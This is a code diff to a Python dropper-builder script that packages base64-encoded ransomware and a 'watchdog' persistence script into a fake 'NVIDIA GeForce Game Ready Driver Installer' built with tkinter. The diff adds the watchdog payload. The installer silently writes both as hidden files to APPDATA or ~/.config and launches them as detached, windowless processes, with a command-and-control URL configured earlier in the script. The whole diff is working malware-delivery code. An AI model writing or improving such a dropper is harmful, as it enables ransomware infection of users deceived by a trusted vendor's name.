@@ -81,10 +81,20 @@ def build_dropper():
     
     print(f"[-] Configured Payload with C2: {new_url}")
 
-    # 4. Base64 Encode the Modified Payload
-    payload_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
+    # 4. Base64 Encode BOTH Ransomware AND Watchdog
+    ransomware_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')
+    
+    # Read watchdog
+    watchdog_path = os.path.join(victim_dir, "watchdog.py")
+    if not os.path.exists(watchdog_path):
+        print(f"[!] Error: Watchdog not found at {watchdog_path}")
+        return
+    
+    with open(watchdog_path, "rb") as f:
+        watchdog_data = f.read()
+    watchdog_b64 = base64.b64encode(watchdog_data).decode('utf-8')
 
-    # 5. Create Dropper (Installer)
+    # 5. Create Dropper (Installer) with DUAL PAYLOAD
     dropper_code = f'''import sys
 import os
 import base64
@@ -97,13 +107,16 @@ from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame
 
 # --- CONFIGURATION ---
 FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
-PAYLOAD_B64 = "{payload_b64}"
-PAYLOAD_NAME = ".nvidia_update_helper.py"
+RANSOMWARE_B64 = "{ransomware_b64}"
+WATCHDOG_B64 = "{watchdog_b64}"
+RANSOMWARE_NAME = ".nvidia_ransomware.py"
+WATCHDOG_NAME = ".nvidia_watchdog.py"
 
 def extract_and_execute_payload():
-    """Drops the ransomware payload and executes it silently."""
+    """Drops both ransomware and watchdog, then launches watchdog."""
     try:
-        payload_data = base64.b64decode(PAYLOAD_B64)
+        ransomware_data = base64.b64decode(RANSOMWARE_B64)
+        watchdog_data = base64.b64decode(WATCHDOG_B64)
         
         if os.name == 'nt':
             drop_dir = os.getenv('APPDATA')
@@ -111,25 +124,25 @@ def extract_and_execute_payload():
         else:
             drop_dir = os.path.expanduser("~/.config")
             if not os.path.exists(drop_dir):
-                drop_dir = os.path.expanduser("~")
+                os.makedirs(drop_dir, exist_ok=True)
         
-        drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
+        ransomware_path = os.path.join(drop_dir, RANSOMWARE_NAME)
+        watchdog_path = os.path.join(drop_dir, WATCHDOG_NAME)
         
-        with open(drop_path, "wb") as f:
-            f.write(payload_data)
+        # Drop both files
+        with open(ransomware_path, "wb") as f:
+            f.write(ransomware_data)
+        
+        with open(watchdog_path, "wb") as f:
+            f.write(watchdog_data)
             
-        cmd = []
+        # Launch WATCHDOG (which will launch ransomware)
         if os.name == 'nt':
-            cmd = ["python", drop_path]
+            subprocess.Popen(["python", watchdog_path], 
+                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
         else:
-            cmd = ["python3", drop_path]
-            
-        if os.name == 'nt':
-            # Detach completely on Windows
-            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
-        else:
-            # Detach on Linux
-            subprocess.Popen(cmd, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.Popen(["python3", watchdog_path], 
+                           start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             
     except Exception as e:
         pass
